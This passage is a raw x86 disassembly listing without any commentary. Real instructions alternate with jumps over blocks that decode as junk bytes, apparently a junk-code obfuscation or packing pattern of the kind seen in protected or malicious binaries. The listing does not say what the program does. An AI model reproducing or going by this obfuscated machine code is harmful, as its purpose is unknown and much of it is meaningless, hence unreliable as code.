  41cd17:	jbe    0x41cd35
  41cd19:	sahf   
  41cd1a:	mov    ebx,esi
  41cd1c:	inc    BYTE PTR ds:0x11d5d943
  41cd22:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd24:	push   0x92a9ec9e
  41cd29:	ret    
  41cd2a:	xchg   edi,eax
  41cd2b:	push   0xfffffff6
  41cd2d:	jg     0x41ccf5
  41cd2f:	lea    esi,[ebx+ebp*1+0x4f]
  41cd33:	jno    0x41cce2
  41cd35:	adc    dl,BYTE PTR ds:0x25f95c9c
  41cd3b:	(bad)  
  41cd3c:	dec    ebx
  41cd3d:	sbb    eax,0x61bfa223
  41cd42:	repnz lds edx,FWORD PTR [eax-0x13a347d0]
  41cd49:	stos   BYTE PTR es:[edi],al
  41cd4a:	add    ah,0x7f
  41cd4d:	loopne 0x41cdb0
  41cd4f:	inc    esi
  41cd50:	in     eax,0x4e
  41cd52:	inc    ecx
  41cd53:	sbb    dh,dl
  41cd55:	dec    edi
  41cd56:	mov    dh,0x32
  41cd58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd59:	xchg   esi,eax
  41cd5a:	hlt    
  41cd5b:	out    dx,al
  41cd5c:	pop    ecx
  41cd5d:	les    eax,FWORD PTR [ebx-0x3e]
  41cd60:	sub    eax,0x1afc7bdf
  41cd65:	mov    ds:0xd06a2fbf,al
  41cd6a:	push   cs
  41cd6b:	or     edi,DWORD PTR [edi]
  41cd6d:	push   eax
  41cd6e:	sbb    DWORD PTR ds:0x43355c,0x433590
  41cd78:	lea    eax,[esp+0x1c]
  41cd7c:	push   eax
  41cd7d:	xor    DWORD PTR ds:0x433580,0x433558
  41cd87:	jmp    0x41ce52
  41cd8c:	(bad)  
  41cd8d:	sti    
  41cd8e:	xchg   esi,eax
  41cd8f:	js     0x41cd28
  41cd91:	jge    0x41cd91
  41cd93:	dec    DWORD PTR [eax]
  41cd95:	arpl   WORD PTR [ebp+ecx*8-0x21e36bec],sp
  41cd9c:	inc    esp
  41cd9d:	dec    edi
  41cd9e:	add    DWORD PTR [eax],eax
  41cda0:	scas   al,BYTE PTR es:[edi]
  41cda1:	add    BYTE PTR [eax],al
  41cda3:	add    BYTE PTR [ebx+0x2e],bh
  41cda6:	sbb    edx,edx
  41cda8:	ret    
  41cda9:	inc    edx
  41cdaa:	das    
  41cdab:	push   edi
  41cdac:	aam    0xe6
  41cdae:	imul   ebx,DWORD PTR [eax-0x31],0x8f886d33
  41cdb5:	(bad)  
  41cdb6:	leave  
  41cdb7:	push   ecx
  41cdb8:	pop    es
  41cdb9:	loopne 0x41cdc3
  41cdbb:	ret    0x71a2
  41cdbe:	or     ch,BYTE PTR [ebx+0x40]
  41cdc1:	push   es
  41cdc2:	push   ebx
  41cdc3:	imul   BYTE PTR [ebx-0x2c]
  41cdc6:	aas    
  41cdc7:	sub    dh,BYTE PTR [eax]
  41cdc9:	xchg   edx,eax
  41cdca:	arpl   WORD PTR [edx+0x6dfab923],bp
  41cdd0:	shl    ah,1
  41cdd2:	push   ebp
  41cdd3:	stos   BYTE PTR es:[edi],al
  41cdd4:	adc    BYTE PTR [edi-0x5bedb3da],ah
  41cdda:	or     DWORD PTR [ecx],edi
  41cddc:	retf   0x6938
  41cddf:	and    BYTE PTR ds:0xca95f0b2,dl
  41cde5:	sahf   
  41cde6:	pop    esp
  41cde7:	sbb    al,0xb
  41cde9:	sub    al,0xfd
  41cdeb:	clc    
  41cdec:	into   
  41cded:	bound  ebx,QWORD PTR fs:[edi+0x7e]
  41cdf1:	and    ah,BYTE PTR [ebx]
  41cdf3:	add    ebp,esi
  41cdf5:	mov    esi,ss
  41cdf7:	ret    0x2431
  41cdfa:	in     eax,dx
  41cdfb:	in     al,dx
  41cdfc:	mov    ecx,0x98651c24
  41ce01:	setg   BYTE PTR [ecx]
  41ce04:	dec    ebp
  41ce05:	hlt    
  41ce06:	icebp  
  41ce07:	mov    esi,DWORD PTR [ebp-0x1cd98fa3]
  41ce0d:	cmp    ch,BYTE PTR [esi+0x2c]
  41ce10:	pop    edx
  41ce11:	sub    cl,al
  41ce13:	mov    ds:0x5fdb603b,eax
  41ce18:	hlt    
  41ce19:	adc    BYTE PTR [ebp+0x3f670e00],dh
  41ce1f:	mov    bh,0x18
  41ce21:	pusha  
  41ce22:	sbb    BYTE PTR ds:0x27469fa4,dl
  41ce28:	fnstsw WORD PTR ds:0x63c5b844
  41ce2e:	gs mov esp,0xdca305b5
  41ce34:	(bad)  [edx+0x2a]
  41ce37:	inc    esi
  41ce38:	xor    DWORD PTR [esi+0x3e3ab8c9],edx
  41ce3e:	jl     0x41ce50
  41ce40:	inc    ebp
  41ce41:	xchg   BYTE PTR [ebx+edx*2+0x53],ch
  41ce45:	xchg   ebx,eax
  41ce46:	adc    al,0x5e
  41ce48:	ins    DWORD PTR es:[edi],dx
  41ce49:	ret    
  41ce4a:	cmp    DWORD PTR [esp+eax*2+0x75],esp
  41ce4e:	xor    ch,cl
  41ce50:	adc    DWORD PTR [eax+ebp*8+0x4b],ebp
  41ce54:	retf   0xffff
  41ce57:	sbb    DWORD PTR ds:0x43353c,ecx
  41ce5d:	mov    eax,DWORD PTR [esp+0x10]
  41ce61:	jmp    0x41cf2c
  41ce66:	iret   
  41ce67:	inc    edx
  41ce68:	jbe    0x41cea6
  41ce6a:	(bad)  
  41ce6b:	cmp    al,0xcf
  41ce6d:	repz imul eax,DWORD PTR ds:[edi-0x22],0xffffffc1
  41ce73:	(bad)  
  41ce74:	mov    cs,WORD PTR [edi]
  41ce76:	repnz dec edi
  41ce78:	add    DWORD PTR [eax],eax
  41ce7a:	scas   al,BYTE PTR es:[edi]
  41ce7b:	add    BYTE PTR [eax],al
  41ce7d:	add    bl,ah
  41ce7f:	ins    DWORD PTR es:[edi],dx
  41ce80:	or     al,0xe3
  41ce82:	cli    
  41ce83:	adc    ah,BYTE PTR [edx]
  41ce85:	push   esi
  41ce86:	fwait
  41ce87:	jmp    0xe329:0xd773cee1
  41ce8e:	sti    
  41ce8f:	xor    bl,BYTE PTR [eax-0x25]
  41ce92:	mov    dh,0x8b
  41ce94:	xor    DWORD PTR fs:[ebx],edi
  41ce97:	sub    DWORD PTR [esi],ecx
  41ce99:	dec    eax
  41ce9a:	ins    DWORD PTR es:[edi],dx
  41ce9b:	mov    edi,0x7a62461d
  41cea0:	fs aas 
  41cea2:	mov    ch,0x1d
  41cea4:	jge    0x41ceae
  41cea6:	jl     0x41cf24
  41cea8:	les    ebp,FWORD PTR [ecx+0x46]
  41ceab:	not    DWORD PTR [edi-0x5]
  41ceae:	mov    bl,0x9b
  41ceb0:	fwait
  41ceb1:	pop    esp
  41ceb2:	add    BYTE PTR [ecx-0x5a],dl
  41ceb5:	outs   dx,DWORD PTR ds:[esi]
  41ceb6:	inc    esp
  41ceb7:	xchg   ebp,eax
  41ceb8:	dec    ebp
  41ceb9:	pop    es
  41ceba:	push   eax
  41cebb:	repnz out 0xe2,al
  41cebe:	pop    esp
  41cebf:	out    0x1f,al
  41cec1:	lea    esi,[eax-0x2f]
  41cec4:	and    bl,BYTE PTR [edi]
  41cec6:	sbb    BYTE PTR [edi],cl
  41cec8:	adc    al,0xc
  41ceca:	stos   BYTE PTR es:[edi],al
  41cecb:	pop    ss
  41cecc:	jecxz  0x41cf4d
  41cece:	xor    bh,BYTE PTR [ecx+0x504c63cb]
  41ced4:	adc    al,0xc9
  41ced6:	(bad)  
  41ced7:	push   ds
  41ced8:	adc    edx,DWORD PTR [edi+0x17]
  41cedb:	or     al,0x59
  41cedd:	add    al,0xad
  41cedf:	add    DWORD PTR [esi+0x1f],edi
  41cee2:	fisubr DWORD PTR [esi-0x12f98174]
  41cee8:	ins    BYTE PTR es:[edi],dx
  41cee9:	fsub   DWORD PTR [edi+0x75]
  41ceec:	pop    edx
  41ceed:	xchg   BYTE PTR [esi+eax*1+0x67168f05],bl
  41cef4:	dec    edx
  41cef5:	pushf  
  41cef6:	inc    esi
  41cef7:	ror    DWORD PTR [eax],cl
  41cef9:	(bad)  
  41cefa:	lock add DWORD PTR ds:0x4a109c23,0x1ea6c9ca
  41cf05:	sub    BYTE PTR [ebx+edx*1+0x575106e],ah
  41cf0c:	adc    BYTE PTR ds:0x2924b4cb,0xb
  41cf13:	fild   QWORD PTR [ebp-0x49]
  41cf16:	inc    esi
  41cf17:	mov    ch,0xae
  41cf19:	into   
  41cf1a:	sbb    eax,0x1a564f4b
  41cf1f:	xchg   ecx,eax
  41cf20:	and    ebp,0x729c69f1
  41cf26:	fmul   st(1),st
  41cf28:	jmp    0x41cf5b
  41cf2a:	adc    dl,dl
  41cf2c:	mov    ecx,DWORD PTR [esp+0x14]
  41cf30:	mov    edi,DWORD PTR ds:0x433570
  41cf36:	add    edi,DWORD PTR ds:0x433588
  41cf3c:	mov    DWORD PTR ds:0x433570,edi
  41cf42:	push   DWORD PTR [ebp+0x18]
  41cf45:	mov    edi,DWORD PTR [ebp+0x8]
  41cf48:	jmp    0x41d013
  41cf4d:	call   0xffbb:0x7fbb5ef7
  41cf54:	idiv   eax
  41cf56:	mov    ah,0x53
  41cf58:	ins    DWORD PTR es:[edi],dx
  41cf59:	into   
  41cf5a:	jge    0x41cf71
  41cf5c:	xor    esp,DWORD PTR [eax-0x51fffeb0]
  41cf62:	add    BYTE PTR [eax],al
  41cf64:	add    BYTE PTR [ebp-0x16431320],ah
  41cf6a:	mov    ds:0x49f1149c,al
  41cf6f:	pop    eax
  41cf70:	test   BYTE PTR [ebp+eax*2+0x36],ah
  41cf74:	or     al,0x4c
  41cf76:	or     DWORD PTR [edx+0x21dda7ce],esi
  41cf7c:	jecxz  0x41cf49
  41cf7e:	cmp    al,0xbb
  41cf80:	add    edx,DWORD PTR [edi-0xf38aad3]
  41cf86:	dec    ebp
  41cf87:	es or  al,0xe4
  41cf8a:	pop    esi
  41cf8b:	test   eax,0xeaebe219
  41cf90:	in     eax,0x3d
  41cf92:	xor    eax,0xb1be3609
  41cf97:	dec    esp
  41cf98:	stos   BYTE PTR es:[edi],al
  41cf99:	repnz mov eax,0x84e1e00c
  41cf9f:	lods   eax,DWORD PTR ds:[esi]
  41cfa0:	sbb    BYTE PTR [ebx],bh
  41cfa2:	sbb    DWORD PTR [ebx+ebx*2+0x6b04ec71],ebx
  41cfa9:	sub    bl,BYTE PTR [eax+0x3002b002]
  41cfaf:	and    edx,DWORD PTR [edi-0x5d]
  41cfb2:	or     DWORD PTR [esi],esi
  41cfb4:	je     0x41cf8d
  41cfb6:	je     0x41cfff
  41cfb8:	out    dx,al
  41cfb9:	lea    esi,[eax+0x182d503a]
  41cfbf:	pop    edi
  41cfc0:	call   0xb244ebe9
  41cfc5:	daa    
  41cfc6:	rol    DWORD PTR [ebx-0x4dadd4c5],0x8a
  41cfcd:	pop    esi
  41cfce:	dec    esp
  41cfcf:	ins    DWORD PTR es:[edi],dx
  41cfd0:	ss je  0x41d04b
  41cfd3:	dec    edi
  41cfd4:	xchg   DWORD PTR [ecx+0x7920512d],esp
  41cfda:	(bad)  
  41cfdb:	int    0x57
  41cfdd:	shl    BYTE PTR ds:0x22babb02,0x8a
  41cfe4:	pop    ebp
  41cfe5:	push   esp
  41cfe6:	or     dl,BYTE PTR [eax]
  41cfe8:	jge    0x41cf75
  41cfea:	xchg   edi,eax
  41cfeb:	mov    fs,edx
  41cfed:	outs   dx,DWORD PTR ds:[esi]
  41cfee:	inc    ecx
  41cfef:	pop    edx
  41cff0:	push   es
  41cff1:	je     0x41cfbb
  41cff3:	mov    al,0x3
  41cff5:	hlt    
  41cff6:	and    eax,0x4d5b138f
  41cffb:	not    al
  41cffd:	add    ch,BYTE PTR [edi+0x57d5350b]
  41d003:	in     al,0xae
  41d005:	jnp    0x7f2e8824
  41d00b:	lahf   
  41d00c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d00d:	outs   dx,DWORD PTR ds:[esi]
  41d00e:	clc    
  41d00f:	mov    esp,ebx
  41d011:	jno    0x41cfdf
  41d013:	push   DWORD PTR [ebp+0x14]
  41d016:	lea    eax,[ebp+0x18]
  41d019:	push   DWORD PTR [ebp+0x10]
  41d01c:	push   DWORD PTR [esp+0x18]
  41d020:	push   DWORD PTR [esp+0x18]
  41d024:	push   DWORD PTR [ebp+0xc]
  41d027:	push   eax
  41d028:	push   DWORD PTR [esp+0x38]
  41d02c:	jmp    0x41d0f7
  41d031:	lods   al,BYTE PTR ds:[esi]
  41d032:	push   esi
  41d033:	clc    
  41d034:	mov    edx,edi
  41d036:	scas   eax,DWORD PTR es:[edi]
  41d037:	std    
  41d038:	ja     0x41d085
  41d03a:	inc    ecx
  41d03b:	mov    edi,0xb6d6a00f
  41d040:	or     eax,0x1514e
  41d045:	scas   al,BYTE PTR es:[edi]
  41d046:	add    BYTE PTR [eax],al
  41d048:	add    BYTE PTR [esi+0x54],bh
  41d04b:	add    ebp,DWORD PTR [eax+0x4e]
  41d04e:	mov    ds:0x7a10381a,eax
  41d053:	or     DWORD PTR [esi+eiz*2],esi
  41d056:	popf   
  41d057:	or     BYTE PTR [esi+0x391ddf94],ch
  41d05d:	jno    0x41d068
  41d05f:	cmc    
  41d060:	push   ecx
  41d061:	sbb    DWORD PTR [esi],ecx
  41d063:	mov    dl,0x2c
  41d065:	jp     0x41d01f
  41d067:	test   al,0x1
  41d069:	adc    DWORD PTR [edx-0x79],ebx
  41d06c:	fwait
  41d06d:	adc    ebp,esi
  41d06f:	sbb    eax,0x9b304718
  41d074:	mov    esi,0x6bcd17dc
  41d079:	mov    al,ds:0x2da9a426
  41d07e:	in     al,dx
  41d07f:	std    
  41d080:	inc    ebp
  41d081:	into   
  41d082:	iret   
  41d083:	push   0x77187db5
  41d088:	push   eax
  41d089:	or     cl,ah
  41d08b:	mov    ds:0x2f2a51a7,eax
  41d090:	or     esi,DWORD PTR [ebp+0x76849ac0]
  41d096:	call   0xbb2d90e3
  41d09b:	adc    eax,DWORD PTR [eax+0x3b]
  41d09e:	xor    esp,eax
  41d0a0:	mov    ecx,0x90920b8a
  41d0a5:	xchg   ebp,eax
  41d0a6:	cmp    eax,0x903dc21d
  41d0ab:	test   eax,0x4e68e66f
  41d0b0:	stos   BYTE PTR es:[edi],al
  41d0b1:	jns    0x41d05c
  41d0b3:	dec    esp
  41d0b4:	(bad)  
  41d0b5:	loope  0x41d128
  41d0b7:	div    BYTE PTR [ecx]
  41d0b9:	test   al,0xb5
  41d0bb:	sahf   
  41d0bc:	(bad)  
  41d0bd:	arpl   WORD PTR [ecx+eax*1+0x21af5aae],bx
  41d0c4:	and    DWORD PTR [eax+0x54],0x162bda66
  41d0cb:	sbb    al,0x78
  41d0cd:	in     al,dx
  41d0ce:	repz inc esi
  41d0d0:	push   edi
  41d0d1:	pusha  
  41d0d2:	pop    esp
  41d0d3:	ret    
  41d0d4:	ret    0xefe2
  41d0d7:	dec    ebp
  41d0d8:	(bad)  
  41d0d9:	loop   0x41d068
  41d0db:	loope  0x41d0fd
  41d0dd:	push   esi
  41d0de:	imul   ebp,DWORD PTR [edi+0x6e136eae],0xffffffcb
  41d0e5:	loop   0x41d11f
  41d0e7:	push   ss
  41d0e8:	retf   
  41d0e9:	dec    edi
  41d0ea:	lods   al,BYTE PTR ds:[esi]
  41d0eb:	jp     0x41d0d0
  41d0ed:	push   esi
  41d0ee:	cmp    eax,0xcef11cf2
  41d0f3:	pavgw  mm2,QWORD PTR [ebx-0x77]
  41d0f7:	push   DWORD PTR [esp+0x38]
  41d0fb:	call   0x402000
  41d100:	pop    edi
  41d101:	mov    esp,ebp
  41d103:	pop    ebp
  41d104:	ret    0x14
  41d107:	push   ebp
  41d108:	mov    ebp,esp
  41d10a:	sub    esp,0x3c
  41d10d:	jmp    0x41d1d9
  41d112:	mov    dh,0xce
  41d114:	or     DWORD PTR [ebp-0x20411887],esp
  41d11a:	(bad)  
  41d11b:	mov    ebx,ebp
  41d11d:	jo     0x41d173
  41d11f:	mov    bh,0x9d
  41d121:	xor    edi,esp
  41d123:	push   ecx
  41d124:	add    DWORD PTR [eax],eax
  41d126:	scas   eax,DWORD PTR es:[edi]
  41d127:	add    BYTE PTR [eax],al
  41d129:	add    BYTE PTR [edi+ebx*4],ah
  41d12c:	or     BYTE PTR [edi-0x1b],0x73
  41d130:	jno    0x41d157
  41d132:	sahf   
  41d133:	loope  0x41d155
  41d135:	ret    0x4d6b
  41d138:	jg     0x41d161
  41d13a:	fcomp  QWORD PTR [esi]
  41d13c:	adc    eax,0x8129fba9
  41d141:	lods   al,BYTE PTR ds:[esi]
  41d142:	aad    0xe3
  41d144:	mov    edx,0x7f5b557e
  41d149:	dec    edi
  41d14a:	or     eax,0x51a5d3f1
  41d14f:	out    dx,eax
  41d150:	in     eax,0x74
  41d152:	(bad)
  41d155:	jnp    0x41d15c
  41d157:	xor    ah,BYTE PTR [edx-0x3d]
  41d15a:	inc    ebp
  41d15b:	sti    
  41d15c:	xchg   ebp,eax
  41d15d:	mov    ss,WORD PTR [ebx-0x73]
  41d160:	add    BYTE PTR [esi-0x6c],bl
  41d163:	nop
  41d164:	fxch   st(2)
  41d166:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d167:	xor    eax,0xad125da2
  41d16c:	dec    esi
  41d16d:	push   es
  41d16e:	inc    esp
  41d16f:	into   
  41d170:	ins    DWORD PTR es:[edi],dx
  41d171:	mov    ecx,0xd59110e9
  41d176:	cli    
  41d177:	mov    ecx,0x904ce5cc
  41d17c:	adc    ecx,DWORD PTR [edi+0x383d562]
  41d182:	ja     0x41d15d
  41d184:	and    DWORD PTR [edx],ebx
  41d186:	in     eax,dx
  41d187:	pop    ebx
  41d188:	and    eax,0x9db4928c
  41d18d:	ficom  WORD PTR [eax]
  41d18f:	out    dx,eax
  41d190:	(bad)  
  41d191:	xor    BYTE PTR [eax-0x2485a6a9],bh
  41d197:	pop    ebx
  41d198:	rol    BYTE PTR [ebp-0xc],cl
  41d19b:	cmp    esi,DWORD PTR [ebx-0x765d0dc1]
  41d1a1:	push   0xffffffbf
  41d1a3:	outs   dx,DWORD PTR ds:[esi]
  41d1a4:	call   0xf04b:0x74b42e83
  41d1ab:	jle    0x41d159
  41d1ad:	daa    
  41d1ae:	cmp    al,BYTE PTR [edx]
  41d1b0:	mov    ebx,DWORD PTR [eax+0x3bc365e]
  41d1b6:	sub    esi,DWORD PTR [edi-0x25]
  41d1b9:	jg     0x41d1f2
  41d1bb:	mov    DWORD PTR [ebp-0x3e],ebx
  41d1be:	sub    al,ch
  41d1c0:	push   ebx
  41d1c1:	adc    eax,0x3cfe95cf
  41d1c6:	inc    ebx
  41d1c7:	sub    BYTE PTR [edx],bl
  41d1c9:	aam    0xfa
  41d1cb:	xchg   esi,edi
  41d1cd:	push   ebx
  41d1ce:	js     0x41d1fb
  41d1d0:	loop   0x41d1d6
  41d1d2:	push   ds
  41d1d3:	int    0x13
  41d1d5:	arpl   WORD PTR [eax+0x5a],bp
  41d1d8:	inc    edi
  41d1d9:	mov    DWORD PTR [ebp-0x3c],0x1761
  41d1e0:	mov    DWORD PTR [ebp-0x38],0x5250
  41d1e7:	mov    DWORD PTR [ebp-0x10],0x1d44
  41d1ee:	mov    DWORD PTR [ebp-0xc],0x3d5e
  41d1f5:	mov    DWORD PTR [ebp-0x8],0x605f
  41d1fc:	jmp    0x41d2c8
  41d201:	cmp    eax,0xa3fd811f
  41d206:	(bad)  
  41d207:	jge    0x41d1e8
  41d209:	sub    eax,0xd870de47
  41d20e:	pop    esi
  41d20f:	std    
  41d210:	cmp    DWORD PTR [ebx-0x50fffeae],ebp
  41d216:	add    BYTE PTR [eax],al
  41d218:	add    dl,al
  41d21a:	push   esp
  41d21b:	pusha  
  41d21c:	push   ecx
  41d21d:	mov    ds:0xb7e8d6c3,al
  41d222:	daa    
  41d223:	mov    edx,0x82d518ec
  41d228:	push   ebp
  41d229:	inc    esp
  41d22a:	sbb    BYTE PTR [edi+0x5e],bl
  41d22d:	das    
  41d22e:	int3   
  41d22f:	fst    QWORD PTR [eax+ecx*8]
  41d232:	sub    DWORD PTR [edx-0x39f27b4b],ebx
  41d238:	stos   DWORD PTR es:[edi],eax
  41d239:	ins    DWORD PTR es:[edi],dx
  41d23a:	mov    esp,0x4b4110e7
  41d23f:	and    DWORD PTR [esp+ebx*2+0x13e4d6ce],ecx
  41d246:	push   ecx
  41d247:	mov    bl,0xe6
  41d249:	push   ebp
  41d24a:	scas   al,BYTE PTR es:[edi]
  41d24b:	out    dx,al
  41d24c:	sub    eax,0x48d3a821
  41d251:	dec    edx
  41d252:	lods   eax,DWORD PTR ds:[esi]
  41d253:	popa   
  41d254:	or     ebx,esi
  41d256:	or     BYTE PTR [esi-0xfe7b0fe],dl
  41d25c:	xor    al,0x5c
  41d25e:	jle    0x41d2d2
  41d260:	mov    ch,bh
  41d262:	(bad)  
  41d263:	dec    eax
  41d264:	jp     0x41d20d
  41d266:	into   
  41d267:	xor    DWORD PTR [ebp+edx*4-0x61],ebp
  41d26b:	xchg   BYTE PTR [eax+0xb],dh
  41d26e:	mov    ?,WORD PTR [ebp*4+0x3597bffd]
  41d275:	sub    esp,DWORD PTR [eax-0x76]
  41d278:	sbb    BYTE PTR [ebx+eiz*4],bl
  41d27b:	dec    ebp
  41d27c:	iret   
  41d27d:	inc    edi
  41d27e:	xchg   esp,eax
  41d27f:	and    al,0x4d
  41d281:	dec    edx
  41d282:	or     eax,0xa4b4c82c
  41d287:	or     edi,esi
  41d289:	xchg   DWORD PTR [eax],ecx
  41d28b:	dec    edx
  41d28c:	div    DWORD PTR [ecx]
  41d28e:	stos   DWORD PTR es:[edi],eax
  41d28f:	cmc    
  41d290:	fild   WORD PTR [esi-0x6b]
  41d293:	cwde   
  41d294:	popa   
  41d295:	sar    esp,1
  41d297:	sub    DWORD PTR [eax],esi
  41d299:	test   eax,0x809e898f
  41d29e:	cmp    DWORD PTR [ecx+0x3f],esp
  41d2a1:	clc    
  41d2a2:	out    0x91,al
  41d2a4:	in     al,0x53
  41d2a6:	jae    0x41d30b
  41d2a8:	lock pop ebp
  41d2aa:	lds    ebx,FWORD PTR [ebx]
  41d2ac:	jmp    0x41d311
  41d2ae:	jno    0x41d2a4
  41d2b0:	add    eax,DWORD PTR [eax-0x4b]
  41d2b3:	shr    BYTE PTR [ecx+0x8],cl
  41d2b6:	cdq    
  41d2b7:	and    eax,0x65d9f666
  41d2bc:	lods   al,BYTE PTR ds:[esi]
  41d2bd:	pop    esi
  41d2be:	mov    ch,0x1a
  41d2c0:	mov    al,ds:0x800b90e6
  41d2c5:	aaa    
  41d2c6:	int    0x22
  41d2c8:	mov    DWORD PTR [ebp-0x4],0x3f5e
  41d2cf:	mov    DWORD PTR [ebp-0x34],0x3dda
  41d2d6:	mov    DWORD PTR [ebp-0x30],0x3178
  41d2dd:	mov    DWORD PTR [ebp-0x2c],0x4762
  41d2e4:	mov    DWORD PTR [ebp-0x28],0x1fa3
  41d2eb:	mov    DWORD PTR [ebp-0x24],0x27ce
  41d2f2:	mov    DWORD PTR [ebp-0x20],0x575
  41d2f9:	mov    DWORD PTR [ebp-0x1c],0x3343
  41d300:	jmp    0x41d3cc
  41d305:	or     edi,DWORD PTR [edi]
  41d307:	hlt    
  41d308:	into   
  41d309:	hlt    
  41d30a:	iret   
  41d30b:	cmp    edi,edi
  41d30d:	add    DWORD PTR [ecx],edx
  41d30f:	or     eax,0x1447ffa1
  41d314:	ret    
  41d315:	pop    edx
  41d316:	push   ebx
  41d317:	add    DWORD PTR [eax],eax
  41d319:	scas   eax,DWORD PTR es:[edi]
  41d31a:	add    BYTE PTR [eax],al
  41d31c:	add    BYTE PTR [esi-0x45bfecf8],al
  41d322:	mov    dh,0x5c
  41d324:	(bad)  
  41d325:	loopne 0x41d3a6
  41d327:	jb     0x41d2f7
  41d329:	push   cs
  41d32a:	xchg   ecx,eax
  41d32b:	push   edx
  41d32c:	retf   0xe86a
  41d32f:	and    ecx,edx
  41d331:	dec    edi
  41d332:	test   BYTE PTR [edx+0x65],bl
  41d335:	je     0x41d313
  41d337:	push   edi
  41d338:	or     al,0xb8
  41d33a:	test   BYTE PTR [eax],bh
  41d33c:	jp     0x41d3ab
  41d33e:	push   ebx
  41d33f:	stos   BYTE PTR es:[edi],al
  41d340:	jp     0x41d2fa
  41d342:	mov    edi,es
  41d344:	js     0x41d33d
  41d346:	jmp    ebx
  41d348:	in     al,dx
  41d349:	(bad)  
  41d34a:	xchg   esi,eax
  41d34b:	cld    
  41d34c:	fwait
  41d34d:	add    DWORD PTR [eax+eax*2],ebx
  41d350:	xor    BYTE PTR [eax-0x5c],0x33
  41d354:	sar    ah,0xc5
  41d357:	add    esi,DWORD PTR [edx]
  41d359:	pop    ebp
  41d35a:	stos   DWORD PTR es:[edi],eax
  41d35b:	rcr    dh,0x1b
  41d35e:	das    
  41d35f:	and    BYTE PTR [edx+0x703ad5a5],al
  41d365:	aas    
  41d366:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41d368:	mov    edx,0x15674da5
  41d36d:	push   es
  41d36e:	pop    esi
  41d36f:	push   edi
  41d370:	shr    BYTE PTR [esi-0x35c4ff0e],0x84
  41d377:	rcl    BYTE PTR [esi-0x24],cl
  41d37a:	cmp    eax,0x3d956821
  41d37f:	pop    ebp
  41d380:	lahf   
  41d381:	fldenv [ebp-0x63]
  41d384:	out    0xe,al
  41d386:	mov    ebx,0xa05148e1
  41d38b:	in     al,dx
  41d38c:	add    al,0xc8
  41d38e:	pop    ds
  41d38f:	call   0x1b5b:0x29323175
  41d396:	repnz cmp DWORD PTR [ecx+0x56],ebp
  41d39a:	call   0xa086:0x1ada6d5f
  41d3a1:	inc    ecx
  41d3a2:	repnz mov ds:0xb7458e7a,eax
  41d3a8:	mov    eax,DWORD PTR ds:0x546329a7
  41d3ae:	push   ebx
  41d3af:	fisub  WORD PTR [ebx-0x7e6285ba]
  41d3b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3b6:	pop    edx
  41d3b7:	fldcw  WORD PTR [ebx+0x57668468]
  41d3bd:	inc    edx
  41d3be:	leave  
  41d3bf:	test   al,0x1d
  41d3c1:	adc    ecx,ecx
  41d3c3:	mov    ecx,DWORD PTR [ebp-0x24821159]
  41d3c9:	add    eax,0x45c7a1af
  41d3ce:	call   0x421816
  41d3d3:	mov    eax,DWORD PTR [ebp-0x4]
  41d3d6:	add    eax,DWORD PTR [ebp-0x8]
  41d3d9:	jmp    0x41d4a5
  41d3de:	adc    al,dh
  41d3e0:	mov    edx,0x37fffe8f
  41d3e5:	fistp  QWORD PTR [esi+ecx*4]
  41d3e8:	sbb    dh,0xe4
  41d3eb:	sbb    DWORD PTR [eax],esi
  41d3ed:	add    cl,BYTE PTR [ecx]
  41d3ef:	push   esp
  41d3f0:	add    DWORD PTR [eax],eax
  41d3f2:	scas   eax,DWORD PTR es:[edi]
  41d3f3:	add    BYTE PTR [eax],al
  41d3f5:	add    BYTE PTR [ecx+ebp*1+0x41e5ad99],bh
  41d3fc:	leave  
  41d3fd:	test   DWORD PTR [ecx],ebp
  41d3ff:	ret    0xaf3b
  41d402:	xchg   esp,eax
  41d403:	sbb    ebp,DWORD PTR [ecx+0x74]
  41d406:	xchg   edx,eax
  41d407:	(bad)  
  41d408:	fs xchg esp,eax
  41d40a:	xchg   ebp,eax
  41d40b:	imul   edx,DWORD PTR ss:[edx+0x31a303e],0xdd15bc42
  41d416:	inc    eax
  41d417:	in     eax,dx
  41d418:	in     al,0xfc
  41d41a:	les    ecx,FWORD PTR [ecx]
  41d41c:	pop    esp
  41d41d:	mov    ?,edx
  41d41f:	ss iret 
  41d421:	ins    BYTE PTR es:[edi],dx
  41d422:	sbb    DWORD PTR [edx],edx
  41d424:	das    
  41d425:	retf   
  41d426:	pop    ebp
  41d427:	jl     0x41d41e
  41d429:	mov    ebx,0x51875d4b
  41d42e:	ficomp DWORD PTR [eax+eiz*2+0x5bbc3236]
  41d435:	test   DWORD PTR [eax+0x6b],ebp
  41d438:	jno    0x41d4a6
  41d43a:	scas   eax,DWORD PTR es:[edi]
  41d43b:	test   eax,0xbeb9f544
  41d440:	adc    bh,BYTE PTR [esi-0x71]
  41d443:	fld    TBYTE PTR [ecx-0x5d94dc37]
  41d449:	or     BYTE PTR [ecx-0x70],ah
  41d44c:	outs   dx,DWORD PTR ds:[esi]
  41d44d:	inc    edx
  41d44e:	push   esp
  41d44f:	jge    0x41d49a
  41d451:	push   es
  41d452:	dec    edx
  41d453:	out    dx,eax
  41d454:	add    BYTE PTR [esi-0x481b43f2],dh
  41d45a:	retf   0x1235
  41d45d:	outs   dx,BYTE PTR ds:[esi]
  41d45e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d45f:	sub    BYTE PTR [edx],ah
  41d461:	cmc    
  41d462:	mov    ebp,0x54c5438b
  41d467:	push   ds
  41d468:	adc    ah,BYTE PTR [edi+eiz*8+0x28629803]
  41d46f:	jl     0x41d4a9
  41d471:	pop    ecx
  41d472:	xchg   esi,eax
  41d473:	jmp    0x64b4:0xe261d879
  41d47a:	fmul   QWORD PTR [edi+0xf]
  41d47d:	xor    BYTE PTR [edx-0x31],ch
  41d480:	out    dx,eax
  41d481:	outs   dx,BYTE PTR ds:[esi]
  41d482:	mov    edx,0xf34a083f
  41d487:	add    BYTE PTR [ecx+0x2c],bl
  41d48a:	pop    esp
  41d48b:	je     0x41d4f0
  41d48d:	aam    0x1d
  41d48f:	nop
  41d490:	shl    BYTE PTR cs:[ebp-0x1f],1
  41d494:	jp     0x41d46b
  41d496:	sbb    dl,BYTE PTR [eax]
  41d498:	pusha  
